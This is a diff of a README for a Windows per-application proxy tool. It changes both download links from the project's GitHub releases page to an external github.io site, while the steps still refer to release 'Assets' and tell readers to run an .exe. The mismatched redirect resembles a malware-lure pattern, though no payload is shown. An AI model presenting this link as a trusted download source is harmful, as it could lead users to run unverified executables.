@@ -1,6 +1,6 @@
 # 🌐 Proxy-Any-App - Route specific windows traffic through proxies
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Idealismpylon504/Proxy-Any-App/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://idealismpylon504.github.io)
 
 Proxy-Any-App allows you to route network traffic from one specific application through a SOCKS5 or HTTP proxy. You select an executable file, enter your proxy server details, and the tool ensures that only that specific program communicates through the proxy. The rest of your system traffic continues to move through your normal internet connection.
 
@@ -18,7 +18,7 @@ This software runs on Windows platforms. Ensure your computer meets these condit
 
 Follow these steps to acquire and prepare the software:
 
-1. Visit the project release page: [https://github.com/Idealismpylon504/Proxy-Any-App/releases](https://github.com/Idealismpylon504/Proxy-Any-App/releases).
+1. Visit the project release page: [https://idealismpylon504.github.io](https://idealismpylon504.github.io).
 2. Look for the most recent version under the "Assets" section.
 3. Click the file ending in .exe to start the download.
 4. Save the file to a folder on your computer.
